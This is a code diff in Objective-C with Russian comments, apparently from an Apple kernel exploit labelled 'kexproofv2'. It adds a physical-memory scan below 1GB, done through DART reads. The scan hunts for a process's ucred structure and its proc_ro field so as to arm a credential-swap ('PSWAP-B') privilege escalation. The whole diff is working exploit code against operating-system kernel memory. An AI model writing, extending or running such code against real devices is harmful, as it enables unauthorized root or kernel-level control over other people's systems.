@@ -8272,7 +8272,8 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
                             // proc-объекта из census) — вот они и добавлены.
                             // 1GB-пол закрывает нижние минные PA.
                             BOOL whitelisted = (t == 0x10 || t == tSafe1 || t == tSafe2 ||
-                                                t == 0x0e || t == 0x21);
+                                                t == 0x0e || t == 0x21 ||
+                                                t == 0x11 || t == 0x13 || t == 0x17 || t == 0x18);
                             if (!whitelisted && (t == 0x37 || t == 0xb || t == 0x15 || t == 0x18)) continue;
                             if (!whitelisted) continue;
                             uint64_t pkva2 = useLinear ? (pa - pB + vB) : phystokv(pa);   // калиброванный путь
@@ -8309,6 +8310,58 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
                             if (typeHist[hi]) [hg appendFormat:@" %d:%u", hi, typeHist[hi]];
                         kpNote(r, [NSString stringWithFormat:@"  [SCAN-Z2] гистограмма типов (кадров %llu, нет-таблицы %u):%@",
                                   (unsigned long long)idx, typeNoTable, hg.length ? hg : @" пусто"]);
+                        // kexproofv2 2.0.8: fallback — нижний спан (PA<1GB) через
+                        // DART-чтение (sentinel вместо паники, в отличие от
+                        // kernel aperture). Только whitelist-типы. 2.0.6/2.0.7
+                        // прочитали всё ≥1GB без хита — ucred либо внизу, либо
+                        // в мелком типе.
+                        if ((!pagePA || !roFieldPA) && svc && tsdV && ttM && isTable) {
+                            kpNote(r, @"  [SCAN-Z2-LOW] DART-проход по нижнему спану (idx<0x10000, whitelist-типы)");
+                            uint64_t lowReads = 0;
+                            for (uint64_t li = 0; li < (0x40000000ULL >> 14) && (!pagePA || !roFieldPA); li++) {
+                                uint64_t lpa = pB + (li << 14);
+                                int lt = kpFrameTypeOf(lpa);
+                                BOOL lw = (lt == 0x10 || lt == tSafe1 || lt == tSafe2 ||
+                                           lt == 0x0e || lt == 0x21 ||
+                                           lt == 0x11 || lt == 0x13 || lt == 0x17 || lt == 0x18);
+                                if (!lw) continue;
+                                uint8_t cimg2[0x4000];
+                                if (!kpPhysRead16K(svc, tsdV, ttM, isTable, lpa, cimg2, r)) continue;
+                                // sentinel 0x5A = DART не прочитал (вне окна/фильтр)
+                                uint64_t q0s = 0; memcpy(&q0s, cimg2, 8);
+                                if (q0s == 0x5A5A5A5A5A5A5A5AULL) continue;
+                                lowReads++;
+                                if ((li & 0x3FF) == 0)
+                                    kpNote(r, [NSString stringWithFormat:@"  [SCAN-Z2-LOW] прогресс %#llx (чтений %llu)",
+                                              (unsigned long long)li, (unsigned long long)lowReads]);
+                                if (!pagePA) {
+                                    uint64_t lb = 0; memcpy(&lb, cimg2 + uoff2 + 0x78, 8);
+                                    uint32_t lu = 0; memcpy(&lu, cimg2 + uoff2 + 0x18, 4);
+                                    if (lb == labelQ && lu == uid32) {
+                                        BOOL full = YES;
+                                        for (uint32_t i = 0; i < 0x100; i += 8)
+                                            if (memcmp(cimg2 + i, ucImg + i, 8)) { full = NO; break; }
+                                        kpNote(r, [NSString stringWithFormat:@"  [SCAN-Z2-LOW] ucred-кандидат pa=%#llx (тип %d) — сверка: %@",
+                                                  (unsigned long long)lpa, lt, full ? @"СОШЛАСЬ ★" : @"мимо"]);
+                                        if (full) pagePA = lpa;
+                                    }
+                                }
+                                if (!roFieldPA && roOff >= 8 && roOff + 0x18 < 0x4000) {
+                                    uint64_t f0 = 0, f1 = 0, f2 = 0, fm = 0;
+                                    memcpy(&fm, cimg2 + roOff, 8);
+                                    memcpy(&f0, cimg2 + roOff - 8, 8);
+                                    memcpy(&f1, cimg2 + roOff + 8, 8);
+                                    memcpy(&f2, cimg2 + roOff + 0x10, 8);
+                                    if (fm == ucF && f0 == roFp0 && f1 == roFp1 && f2 == roFp2) {
+                                        roFieldPA = lpa + roOff;
+                                        kpNote(r, [NSString stringWithFormat:@"  [SCAN-Z2-LOW] ★ proc_ro поле: pa=%#llx — PSWAP-B вооружён",
+                                                  (unsigned long long)roFieldPA]);
+                                    }
+                                }
+                            }
+                            kpNote(r, [NSString stringWithFormat:@"  [SCAN-Z2-LOW] финиш: чтений=%llu ucredPA=%#llx roFieldPA=%#llx",
+                                      (unsigned long long)lowReads, (unsigned long long)pagePA, (unsigned long long)roFieldPA]);
+                        }
                     }
                 }
                 // [PSWAP-B] roFieldPA из скана — тот же p_ucred swap, но без walker'а
